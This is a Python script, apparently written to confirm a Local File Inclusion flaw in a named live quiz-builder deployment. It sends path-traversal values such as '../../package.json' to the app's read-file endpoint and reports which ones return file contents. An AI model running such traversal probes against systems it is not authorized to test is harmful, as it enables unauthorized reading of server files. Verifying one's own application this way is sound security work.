#!/usr/bin/env python3
"""
Quick test script to verify LFI vulnerability in quiz-builder app
"""
import requests
import json

BASE_URL = "https://quiz-builder-ocr.vercel.app/api/read-file"

print("Testing LFI Vulnerability on quiz-builder-ocr.vercel.app\n")
print("=" * 60)

# Test payloads
test_cases = [
    ("package.json", "Should find package.json in current directory"),
    ("../package.json", "Should traverse up one directory"),
    ("../../package.json", "Should traverse up two directories"),
    ("vercel.json", "Should find vercel.json"),
    ("README.md", "Should find README.md"),
]

vulnerable_count = 0

for payload, description in test_cases:
    url = f"{BASE_URL}?file={payload}"
    print(f"\n[TEST] {description}")
    print(f"[URL]  {url}")
    
    try:
        response = requests.get(url, timeout=5)
        
        print(f"[STATUS] {response.status_code}")
        
        try:
            data = response.json()
            print(f"[RESPONSE] {json.dumps(data, indent=2)}")
            
            if data.get('success'):
                print(f"[✓] VULNERABLE - File content retrieved!")
                vulnerable_count += 1
            else:
                print(f"[✗] Not vulnerable")
        except:
            print(f"[RESPONSE] {response.text[:200]}")
            
    except Exception as e:
        print(f"[ERROR] {str(e)}")

print("\n" + "=" * 60)
print(f"\nRESULTS: {vulnerable_count}/{len(test_cases)} payloads found vulnerabilities")

if vulnerable_count > 0:
    print("\n🚨 LFI VULNERABILITY CONFIRMED!")
    print("The application is vulnerable to Local File Inclusion attacks.")
else:
    print("\n✓ No vulnerabilities found with these payloads.")
